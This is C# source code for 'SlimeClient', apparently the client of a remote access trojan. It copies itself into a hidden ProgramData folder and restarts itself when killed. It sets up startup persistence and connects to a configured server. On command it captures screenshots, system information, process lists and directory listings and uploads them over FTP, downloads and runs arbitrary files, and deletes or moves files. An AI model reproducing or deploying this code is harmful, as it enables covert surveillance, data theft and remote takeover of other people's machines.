using FTPClient;
using KnownFolderPaths;
//using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.ExceptionServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace SlimeClient
{
    class MainProgram
    {
        private static DirectoryInfo Serviceinfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Windows\Temp");
        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.ProcessExit += new EventHandler(ProgramExit);
            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(ResolveAssembly);
            SLog("ProgramStart");
            foreach (string item in args)
            {
                if (item == "-r")
                {
                    SLog("RefreshStartupProgram");
                    RefreshStartupProgram();
                }
            }
            ProgramStart();
            Client.Receive += Receive;
            Client.ReceiveFailed += ReceiveFailed;
            Client.Disconnected += Disconnected;
            Start();
        }
        private static void ProgramStart()
        {
            //DirectoryInfo info = new DirectoryInfo(Application.StartupPath);
            if (!Serviceinfo.Exists)
                Serviceinfo.Create();
            if (!File.Exists(Serviceinfo.FullName + @"\Newtonsoft.Json.dll"))
                File.WriteAllBytes(Serviceinfo.FullName + @"\Newtonsoft.Json.dll", Properties.Resources.Newtonsoft_Json);
            if (Application.StartupPath != Serviceinfo.FullName)
            {
                SLog("StartupPath != ClientPath");
                try
                {
                    string appName = Serviceinfo.FullName + @"\Client.exe";
                    if (!File.Exists(appName))
                        File.Copy(Application.ExecutablePath, appName);
                    else
                    {
                        Process[] processes = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
                        foreach (Process item in processes)
                        {
                            if (item.Id != Process.GetCurrentProcess().Id)
                            {
                                item.Kill();
                                SLog("Kill");
                            }
                        }
                        try
                        {
                            File.Delete(appName);
                            File.Copy(Application.ExecutablePath, appName);
                        }
                        catch (Exception ex) { ExceptionLog(ex, "CopyClient"); }
                    }
                    if(Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length < 2)
                        Process.Start(Serviceinfo.FullName + @"\Client.exe");
                    RefreshStartupProgram();
                }
                catch (Exception ex) { ExceptionLog(ex, "CopyClient"); }
                Exit(1);
            }
            else
            {
                if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 2)
                    Exit(5);
                if(Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 2)
                {
                    Thread.Sleep(5000);
                    Process[] processes = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
                    if (processes.Length > 1)
                    {
                        Process ThisProcess = Process.GetCurrentProcess();
                        foreach (Process item in processes)
                        {
                            try
                            {
                                if(ThisProcess != item)
                                    item.Kill();
                            }
                            catch { }
                        }
                    }
                }
            }
        }
        private static void ProgramExit(object sender, EventArgs e)
        {
            if(!IsExit)
                Process.Start(Application.ExecutablePath, "-r");
        }
        private static void Exit(int Code)
        {
            IsExit = true;
            SLog(string.Format("Closed Code: {0}", Code));
            Environment.Exit(Code);
        }
        public static bool IsExit = false;
        private static void RefreshStartupProgram()
        {
            try
            {
                SetupProgramForm form = new SetupProgramForm(Serviceinfo);
                form.ShowDialog();
                if(form.Ex != null)
                    ExceptionLog(form.Ex, "RefreshStartupProgram");
                if (form != null)
                    form.Dispose();
                //string NwName = "Client V0.0.1";
                //FileInfo info = new FileInfo(Path.Combine(Serviceinfo.FullName, "StartInfo.id"));
                //string sp1 = "USER\\Software\\Microsoft\\Wind";
                //string sp2 = "HKEY_CURRENT_";
                //string sp3 = "ows\\CurrentVersion\\Run";
                //if (info.Exists)
                //{ 
                //    string OdName = null;
                //    try { OdName = File.ReadAllText(info.FullName); } catch (Exception ex) { ExceptionLog(ex, "RefreshStartupProgram"); }
                //    if (OdName == null)
                //        OdName = "Client V0.0.1";
                //    NwName = string.Format("Client V0.0.{0}", int.Parse(Regex.Replace(OdName, @"\D", "") + 1));
                //    ProcessBackgroundStart("reg", string.Format("Delete \"{0}{1}{2}\" /V \"{3}\" /f", sp2, sp1, sp3, OdName), true);
                //}
                //try { File.WriteAllText(info.FullName, NwName); } catch (Exception ex) { ExceptionLog(ex, "RefreshStartupProgram"); }
                //ProcessBackgroundStart("reg", string.Format("Add \"{0}{1}{2}\" /v \"{3}\" /t REG_SZ /d \"{4}\" /f", sp2, sp1, sp3, NwName, Serviceinfo.FullName + @"\Client.exe"), true);
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, "RefreshStartupProgram");
            }
            Exit(6);
        }
        private static void Start()
        {
            string Address = JsonSetting.Get.Address;
            int BufferSize = JsonSetting.Get.BufferSize;
            int Port = JsonSetting.Get.Port;
            bool DNSMode = JsonSetting.Get.DNSMode;
            while (true)
            {
                try
                {
                    IPEndPoint point;
                    if (DNSMode)
                    {
                        point = new IPEndPoint(Dns.GetHostEntry(Address).AddressList[0], Port);
                    }
                    else
                    {
                        point = new IPEndPoint(IPAddress.Parse(Address), Port);
                    }
                    SLog(string.Format("ServerInfo: {0}", point.ToString()));
                    Exception ex = Client.JoinServer(new StartInfo(BufferSize, point));
                    if (ex == null)
                        break;
                    SLog("Connection Failed");
                    ExceptionLog(ex, "Connection");
                }catch (Exception ex) { ExceptionLog(ex, "Connection"); }
                Thread.Sleep(10000);
            }
            SLog("Connection Success");
            while (true)
            {
				Thread.Sleep(10000);
            }
        }

        private static void ReceiveFailed(string code)
        {
            ExceptionLog(new Exception(code), "ReceiveFailed!");
        }

        private static void Receive(MessageReceive info)
        {
            SLog(string.Format("MessageCode.{0}, Value:{1}", info.Code.ToString(), info.Message));
            SLog(info.Code.ToString());
            new Thread(() =>
            {
                if (info.Code == MessageCode.Command)
                {
                    try
                    {
                        if (info.Message == "Shutdown")
                            ProcessBackgroundStart("shutdown", "/s /t 0 /f", false);
                        else if (info.Message == "Reboot")
                            ProcessBackgroundStart("shutdown", "/r /t 0 /f", false);
                        else if (info.Message == "ClientVersion")
                        {
                            Version v = Assembly.GetExecutingAssembly().GetName().Version;
                            Send(MessageCode.Text, string.Format("ClientVersion\x01{0}.{1}.{2}", v.Major, v.Minor, v.Build));
                        }
                        else
                        {
                            string[] tmp = info.Message.Split('\x01');
                            if (tmp.Length == 2)
                            {
                                if (tmp[0] == "SysInfo")
                                {
                                    Process process = new Process();
                                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    process.StartInfo.CreateNoWindow = true;
                                    process.StartInfo.RedirectStandardInput = true;
                                    process.StartInfo.RedirectStandardOutput = true;
                                    process.StartInfo.RedirectStandardError = true;
                                    process.StartInfo.UseShellExecute = false;
                                    process.StartInfo.FileName = "SystemInfo";
                                    process.Start();
                                    process.WaitForExit();
                                    string FileName = Path.Combine(Path.GetTempPath(), string.Format("SysInfo{0}.tmp", GetRandomString(8)));
                                    File.WriteAllText(FileName, process.StandardOutput.ReadToEnd());
                                    if (FTP.Upload(FileName, tmp[1]))
                                        Send(MessageCode.FTPUploadOK, tmp[1]);
                                    else
                                        Send(MessageCode.FTPUploadFailed, tmp[1]);
                                }
                            }
                            //else if (tmp.Length == 3)
                            //{
                            //if (tmp[0] == "ShowMessage")
                            //{
                            //    MessageBoxIcon icon = MessageBoxIcon.None;
                            //    if (tmp[1] == "W")
                            //        icon = MessageBoxIcon.Warning;
                            //    else if (tmp[1] == "I")
                            //        icon = MessageBoxIcon.Information;
                            //    else if (tmp[1] == "N")
                            //        icon = MessageBoxIcon.None;
                            //    else if (tmp[1] == "E")
                            //        icon = MessageBoxIcon.Error;
                            //    MessageBox.Show(tmp[2], tmp[3], MessageBoxButtons.OK, icon);
                            //}
                            //}
                        }
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, info.Message.Split('\x01')[0]);
                    }
                }
                else if (info.Code == MessageCode.ScreenShot)
                {
                    try
                    {
                        CommandReturn value = ScreenShotSave(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.ScreenShotOK, value.ReturnMessage);
                        else
                            Send(MessageCode.ScreenShotFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "ScreenShot");
                    }
                }
                else if (info.Code == MessageCode.FTPDownload)
                {
                    try
                    {
                        CommandReturn value = FTPDownload(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.FTPDownloadOK, value.ReturnMessage);
                        else
                            Send(MessageCode.FTPDownloadFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "FTPDownload");
                    }
                }
                else if (info.Code == MessageCode.FTPUpload)
                {
                    try
                    {
                        CommandReturn value = FTPUpload(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.FTPUploadOK, value.ReturnMessage);
                        else
                            Send(MessageCode.FTPUploadFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "FTPUpload");
                    }
                }
                else if (info.Code == MessageCode.HTTPDownload)
                {
                    try
                    {
                        CommandReturn value = HTTPDownload(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.HTTPDownloadOK, value.ReturnMessage);
                        else
                            Send(MessageCode.HTTPDownloadFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "HTTPDownload");
                    }
                }
                else if (info.Code == MessageCode.GetNode)
                {
                    try
                    {
                        CommandReturn value = GetNode(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.GetNodeOK, value.ReturnMessage);
                        else
                            Send(MessageCode.GetNodeFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "GetNode");
                    }
                }
                else if (info.Code == MessageCode.FileInfo)
                {
                    GetFileInfo(info.Message);
                }
                else if (info.Code == MessageCode.ProcessStart)
                {
                    try
                    {
                        CommandReturn value = ProcessStart(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.ProcessStartOK, value.ReturnMessage);
                        else
                            Send(MessageCode.ProcessStartFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "ProcessStart");
                    }
                }
                else if (info.Code == MessageCode.ProcessKill)
                {
                    try
                    {
                        CommandReturn value = ProcessKill(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.ProcessKillOK, value.ReturnMessage);
                        else
                            Send(MessageCode.ProcessKillFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "ProcessKill");
                    }
                }
                else if (info.Code == MessageCode.GetProcess)
                {
                    try
                    {
                        CommandReturn value = GetProcesses(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.GetProcessOK, value.ReturnMessage);
                        else
                            Send(MessageCode.GetProcessFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "ProcessKill");
                    }
                }
                else if (info.Code == MessageCode.FileMove)
                {
                    try
                    {
                        CommandReturn value = FileMove(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.FileMoveOK, value.ReturnMessage);
                        else
                            Send(MessageCode.FileMoveFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "FileMove");
                    }
                }
                else if (info.Code == MessageCode.FileDelete)
                {
                    try
                    {
                        CommandReturn value = FileDelete(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.FileDeleteOK, value.ReturnMessage);
                        else
                            Send(MessageCode.FileDeleteFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "FileDelete");
                    }
                }
                else if (info.Code == MessageCode.DirectoryMove)
                {
                    try
                    {
                        CommandReturn value = DirectoryMove(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.DirectoryMoveOK, value.ReturnMessage);
                        else
                            Send(MessageCode.DirectoryMoveFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "DirectoryMove");
                    }
                }
                else if (info.Code == MessageCode.DirectoryDelete)
                {
                    try
                    {
                        CommandReturn value = DirectoryDelete(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.DirectoryDeleteOK, value.ReturnMessage);
                        else
                            Send(MessageCode.DirectoryDeleteFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "DirectoryDelete");
                    }
                }
                else if (info.Code == MessageCode.GetFiles)
                {
                    try
                    {
                        CommandReturn value = GetFileExplorer(info.Message);
                        if (value.IsSuccessful)
                            Send(MessageCode.GetFilesOK, value.ReturnMessage);
                        else
                            Send(MessageCode.GetFilesFailed, value.ReturnMessage);
                    }
                    catch (Exception ex)
                    {
                        ExceptionLog(ex, "GetFiles");
                    }
                }
            }).Start();
        }
        private static void Disconnected(Exception ex)
        {
            ExceptionLog(ex, "Disconnected");
            Start();
        }

        #region Assembly
        static Assembly ResolveAssembly(object sender, ResolveEventArgs args)
        {
            Assembly thisAssembly = Assembly.GetExecutingAssembly();
            var name = args.Name.Substring(0, args.Name.IndexOf(',')) + ".dll";
            var resources = thisAssembly.GetManifestResourceNames().Where(s => s.EndsWith(name));
            if (resources.Count() > 0)
            {
                string resourceName = resources.First();
                using (Stream stream = thisAssembly.GetManifestResourceStream(resourceName))
                {
                    if (stream != null)
                    {
                        byte[] assembly = new byte[stream.Length];
                        stream.Read(assembly, 0, assembly.Length);
                        return Assembly.Load(assembly);
                    }
                }
            }
            return null;
        }
        #endregion

        #region log
        private static string LogPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Windows\Temp\ClientLog.log";
        public static void SLog(string Text)
        {
            try
            {
                Console.WriteLine(Text);
            }
            catch { }
            try
            {
                File.AppendAllText(LogPath, string.Format("[{0}] {1}\n", GetTime, Text));
            }
            catch { }
        }
        #endregion

        #region GetTime
        public static string GetTime
        {
            get
            {
                return DateTime.Now.ToString("yyyy-MM-dd H:mm:ss");
            }
        }
        #endregion

        #region GetRandomString
        public static string GetRandomString(int _totLen)
        {
            Random rand = new Random();
            string input = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var chars = Enumerable.Range(0, _totLen).Select(x => input[rand.Next(0, input.Length)]);
            return new string(chars.ToArray());
        }
        #endregion

        #region ScreenShot
        private static CommandReturn ScreenShotSave(string ftpValue)
        {
            try
            {
                Random random = new Random();
                Point a = new Point(0, 0);
                Size b = new Size(0, 0);
                Screen[] screens = Screen.AllScreens;
                if (screens.Length == 1)
                {
                    a = screens[0].Bounds.Location;
                    b = screens[0].Bounds.Size;
                }
                else if (screens.Length > 1)
                {
                    foreach (Screen item in screens)
                    {
                        if (item.Bounds.X < a.X)
                            a.X = item.Bounds.X;
                        if (item.Bounds.Y < a.Y)
                            a.Y = item.Bounds.Y;
                        if (item.Bounds.Width + item.Bounds.X > b.Width)
                            b.Width = item.Bounds.Width + item.Bounds.X;
                        if (item.Bounds.Height + item.Bounds.Y > b.Height)
                            b.Height = item.Bounds.Height + item.Bounds.Y;
                    }
                    b = new Size((a.X * -1) + b.Width, (a.Y * -1) + b.Height);
                }
                Bitmap bitmap;
                Graphics g;
                string FilePath = Path.GetTempPath() + GetRandomString(12);
                bitmap = new Bitmap(b.Width, b.Height);
                g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(a, new Point(0, 0), b);
                g.Dispose();
                bitmap.Save(FilePath);
                bitmap.Dispose();
                //FTP.Upload(FilePath, ftpValue,"AFFS","AFFS_DS")
                return new CommandReturn(FTP.Upload(FilePath, ftpValue), ftpValue);
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.Message);
            }
        }
        #endregion

        #region FTPDownload
        private static CommandReturn FTPDownload(string value)
        {
            string[] tmp = value.Split('\x01');
            if(tmp.Length != 2)
            {
                ExceptionLog(new Exception("Unknown Format"), MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, "Unknown Format");
            }
            try
            {
                string path = ParameterTrans(tmp[1]);
                return new CommandReturn(FTP.Download(path, tmp[0]), "FTP Download");
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region FTPUpload
        private static CommandReturn FTPUpload(string value)
        {
            string[] tmp = value.Split('\x01');
            if (tmp.Length != 2)
            {
                ExceptionLog(new Exception("Unknown Format"), MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, "Unknown Format");
            }
            try
            {
                string path = ParameterTrans(tmp[1]);
                return new CommandReturn(FTP.Upload(path, tmp[0]), tmp[0]);
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region HTTPDownload
        private static CommandReturn HTTPDownload(string value)
        {
            string[] tmp = value.Split('\x01');
            if (tmp.Length != 2)
            {
                ExceptionLog(new Exception("Unknown Format"), MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, "Unknown Format");
            }
            try
            {
                string path = ParameterTrans(tmp[1]);
                FileInfo file = new FileInfo(path);
                if (!file.Directory.Exists)
                    file.Directory.Create();
                using (var client = new WebClient())
                {
                    client.DownloadFile(tmp[0], path);
                }
                return new CommandReturn(true);
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region ParameterTransformation
        private static string ParameterTrans(string input)
        {
            try
            {
                string output = input;
                if (output.Contains("%TempPath%"))
                {
                    string tempPath = Path.GetTempPath();
                    if (tempPath.Substring(tempPath.Length - 1, 1) == "\\")
                        tempPath = tempPath.Substring(0, tempPath.Length - 1);
                    output = output.Replace("%TempPath%", tempPath);
                }
                output = output.Replace("%ClientPath%", Application.StartupPath);
                output = output.Replace("%ClientDesktop%", KnownFolders.GetPath(KnownFolder.Desktop));
                output = output.Replace("%ClientDocuments%", KnownFolders.GetPath(KnownFolder.Documents));
                output = output.Replace("%ClientDownload%", KnownFolders.GetPath(KnownFolder.Downloads));
                return output;
            }
            catch { return input; }
        }
        #endregion

        #region GetNode
        private static StreamWriter NodeWriter = null;
        private static CommandReturn GetNode(string value)
        {
            string[] tmp = value.Split('\x01');
            if (tmp.Length != 2)
            {
                ExceptionLog(new Exception("Unknown Format"), MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, "Unknown Format");
            }
            if (NodeWriter != null)
                return new CommandReturn(false, "NodeWriter Is Not Null");
            try
            {
                DirectoryInfo directory = new DirectoryInfo(ParameterTrans(tmp[1]));
                if (!directory.Exists)
                    return new CommandReturn(false, "Directory does not exist");
                FileInfo logFile = new FileInfo(string.Format("{0}GetNode{1}.tmp", Path.GetTempPath(), GetRandomString(8)));
                if (logFile.Exists)
                    logFile.Delete();
                NodeWriter = new StreamWriter(logFile.FullName);
                string mem_ID = "Null";
                try
                {
                    ManagementClass mc = new ManagementClass("Win32_OperatingSystem");
                    ManagementObjectCollection instances = mc.GetInstances();
                    foreach (ManagementObject info in instances)
                    {
                        mem_ID = (info["InstallDate"].ToString().GetHashCode().ToString().Replace("-", ""));
                    }
                }
                catch (Exception ex)
                {
                    ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                }
                NodeWriter.WriteLine("ID " + mem_ID);
                NodeWriter.WriteLine("ST " + GetTime);
                DirectoryGetFile(directory);
                NodeWriter.WriteLine("ET " + GetTime);
                NodeWriter.Close();
                if (NodeWriter != null)
                    NodeWriter.Dispose();
                NodeWriter = null;
                SLog("NodeSaveOK " + logFile.FullName);
                return new CommandReturn(FTP.Upload(logFile.FullName, tmp[0]), tmp[0]);
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region DirectoryGetFile
        private static void DirectoryGetFile(DirectoryInfo directory)
        {
            try
            {
                NodeWriter.WriteLine("D\x01" + directory.FullName);
                foreach (DirectoryInfo directorY in directory.GetDirectories())
                {
                    if (directorY.Exists && NodeWriter != null)
                        DirectoryGetFile(directorY);
                }
                foreach (FileInfo file in directory.GetFiles())
                {
                    if (file.Exists && NodeWriter != null)
                        NodeWriter.WriteLine("F\x01" + file.FullName);
                }
            }
            catch (Exception ex)
            {
                SLog(string.Format("{0} {1}", MethodBase.GetCurrentMethod().Name, ex.Message));
            }
        }
        #endregion

        #region GetFileInfo
        private static void GetFileInfo(string value)
        {
            string filePath = ParameterTrans(value);
            Send(MessageCase.FileInfo(filePath));
        }
        #endregion

        #region ProcessStart
        private static CommandReturn ProcessStart(string value)
        {
            value = ParameterTrans(value);
            string[] tmp = value.Split('\x01');
            if (tmp.Length != 2)
            {
                ExceptionLog(new Exception("Unknown Format"), MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, "Unknown Format");
            }
            try 
            {
                ProcessStartInfo info = new ProcessStartInfo(tmp[0], tmp[1]);
                try { info.WorkingDirectory = new FileInfo(tmp[0]).Directory.FullName; } catch { }
                Process.Start(info);
                return new CommandReturn(true);
            } 
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region ProcessKill
        private static CommandReturn ProcessKill(string value)
        {
            try
            {
                Process[] processes = Process.GetProcessesByName(value);
                if (processes.Length == 0)
                    processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(value));
                if (processes.Length == 0)
                    return new CommandReturn(false, "No Process Found");
                foreach (Process item in processes)
                {
                    try 
                    { 
                        item.Kill(); 
                        //item.WaitForExit(10000); 
                    } 
                    catch 
                    { 
                        //return new CommandReturn(false, "Timeout"); 
                    }
                }
                CommandReturn command = ProcessBackgroundStart("taskkill", string.Format("/f /im {0}", value), true, 7000);
                if (!command.IsSuccessful)
                    SLog(command.ReturnMessage);
                processes = null;
                Thread.Sleep(100);
                if (Process.GetProcessesByName(value).Length == 0 && Process.GetProcessesByName(Path.GetFileNameWithoutExtension(value)).Length == 0)
                    return new CommandReturn(true);
                return new CommandReturn(false, "Process remains");
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region GetProcesses
        private static CommandReturn GetProcesses(string ftpPath)
        {
            try
            {
                FileInfo logFile = new FileInfo(string.Format("{0}GetProcesses{1}.tmp", Path.GetTempPath(), GetRandomString(8)));
                if (logFile.Exists)
                    logFile.Delete();
                StreamWriter writer = new StreamWriter(logFile.FullName);
                Process[] processes = Process.GetProcesses();
                foreach (Process item in processes)
                {
                    try
                    {
                        string ProcessInfo = "";
                        ProcessInfo += string.Format("ProcessName: \"{0}\"\n", item.ProcessName);
                        ProcessInfo += string.Format("TitleName: \"{0}\"\n", item.MainWindowTitle);
                        ProcessInfo += string.Format("ProcessID: \"{0}\"\n", item.Id);
                        ProcessInfo += string.Format("VMemorySize: \"{0}\"\n", item.VirtualMemorySize64);
                        try
                        {
                            ProcessInfo += string.Format("FilePath: \"{0}\"\n", item.StartInfo.FileName);
                            ProcessInfo += string.Format("FileArguments: \"{0}\"\n", item.StartInfo.Arguments);
                        }
                        catch { }
                        ProcessInfo += ":END\n";
                        writer.WriteLine(ProcessInfo.ToString());
                    }
                    catch { }
                }
                writer.Close();
                if (writer != null)
                    writer.Dispose();
                return new CommandReturn(FTP.Upload(logFile.FullName, ftpPath), ftpPath);
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region FileMove
        private static CommandReturn FileMove(string value)
        {
            try
            {
                string[] tmp = value.Split('\x01');
                if (tmp.Length != 2)
                {
                    ExceptionLog(new Exception("Unknown Format"), MethodBase.GetCurrentMethod().Name);
                    return new CommandReturn(false, "Unknown Format");
                }
                string dest = ParameterTrans(tmp[1]);
                File.Move(ParameterTrans(tmp[0]), dest);
                return new CommandReturn(File.Exists(dest), dest);
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region FileDelete
        private static CommandReturn FileDelete(string filePath)
        {
            try
            {
                string file = ParameterTrans(filePath);
                if(!File.Exists(file))
                    return new CommandReturn(true, "File does not exist");
                File.Delete(file);
                return new CommandReturn(!File.Exists(file), "Delete");
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region DirectoryMove
        private static CommandReturn DirectoryMove(string value)
        {
            try
            {
                string[] tmp = value.Split('\x01');
                if (tmp.Length != 2)
                {
                    ExceptionLog(new Exception("Unknown Format"), MethodBase.GetCurrentMethod().Name);
                    return new CommandReturn(false, "Unknown Format");
                }
                string dest = ParameterTrans(tmp[1]);
                Directory.Move(ParameterTrans(tmp[0]), dest);
                return new CommandReturn(Directory.Exists(dest), dest);
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region DirectoryDelete
        private static CommandReturn DirectoryDelete(string filePath)
        {
            try
            {
                string file = ParameterTrans(filePath);
                if (!Directory.Exists(file))
                    return new CommandReturn(true, "Directory does not exist");
                Directory.Delete(file);
                return new CommandReturn(!Directory.Exists(file), "Delete");
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region ExceptionLog
        private static void ExceptionLog(Exception ex,string Name)
        {
            SLog("==" + Name + "==");
            SLog(ex.ToString());
            SLog("==" + Name + "==");
        }
        #endregion

        #region GetFileExplorer
        private static CommandReturn GetFileExplorer(string value)
        {
            string[] tmp = value.Split('\x01');
            if (tmp.Length != 2)
            {
                ExceptionLog(new Exception("Unknown Format"), MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, "Unknown Format");
            }
            if (NodeWriter != null)
                return new CommandReturn(false, "NodeWriter Is Not Null");
            try
            {
                FileInfo logFile = new FileInfo(string.Format("{0}GetFiles{1}.tmp", Path.GetTempPath(), GetRandomString(8)));
                if (logFile.Exists)
                    logFile.Delete();
                string temp = ParameterTrans(tmp[1]);
                if (temp == "/DriveList")
                {
                    StreamWriter Writer = new StreamWriter(logFile.FullName);
                    foreach (DriveInfo item in DriveInfo.GetDrives())
                    {
                        Writer.WriteLine("D\x01" + item.Name);
                    }
                    Writer.Close();
                    if (Writer != null)
                        Writer.Dispose();
                    Writer = null;
                    return new CommandReturn(FTP.Upload(logFile.FullName, tmp[0]), tmp[0]);
                }
                else
                {
                    DirectoryInfo directory = new DirectoryInfo(ParameterTrans(tmp[1]));
                    if (!directory.Exists)
                        return new CommandReturn(false, "Directory does not exist");
                    StreamWriter Writer = new StreamWriter(logFile.FullName);
                    Writer.WriteLine("P\x01" + directory.FullName);
                    foreach (DirectoryInfo directorY in directory.GetDirectories())
                    {
                        if (directorY.Exists)
                            Writer.WriteLine("D\x01" + directorY.Name);
                    }
                    foreach (FileInfo file in directory.GetFiles())
                    {
                        if (file.Exists)
                            Writer.WriteLine("F\x01" + file.Name);
                    }
                    Writer.Close();
                    if (Writer != null)
                        Writer.Dispose();
                    Writer = null;
                    SLog("ExplorerNodeSaveOK " + logFile.FullName);
                    return new CommandReturn(FTP.Upload(logFile.FullName, tmp[0]), tmp[0]);
                }
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

        #region Send
        private static void Send(MessageCode code, string value)
        {
            Client.Send(code, value);
            SLog(string.Format("Send [{0}, \"{1}\"]", code.ToString() , value));
        }
        private static void Send(JObject jObject)
        {
            Client.Send(jObject);
            SLog(string.Format("Send [{0}, \"{1}\"]", (MessageCode)int.Parse(jObject["Type"].ToString()), jObject["Value"].ToString()));
        }
        #endregion

        #region ProcessBackgroundStart
        private static CommandReturn ProcessBackgroundStart(string FileName, string Args, bool WaitForExit, int TimeOut = -1)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.FileName = FileName;
                process.StartInfo.Arguments = Args;
                process.Start();
                if (WaitForExit)
                {
                    if (TimeOut == -1)
                        process.WaitForExit();
                    else
                        process.WaitForExit(TimeOut);
                    return new CommandReturn(true, string.Format("ExitCode: {0}", process.ExitCode));
                }
                return new CommandReturn(true, "None");
            }
            catch (Exception ex)
            {
                ExceptionLog(ex, MethodBase.GetCurrentMethod().Name);
                return new CommandReturn(false, ex.ToString());
            }
        }
        #endregion

    }
    public class CommandReturn
    {
        public bool IsSuccessful = false;
        public string ReturnMessage = null;
        public CommandReturn() { }
        public CommandReturn(bool isSuccessful, string returnMessage)
        {
            IsSuccessful = isSuccessful;
            ReturnMessage = returnMessage;
        }
        public CommandReturn(bool isSuccessful)
        {
            IsSuccessful = isSuccessful;
        }
    }
}
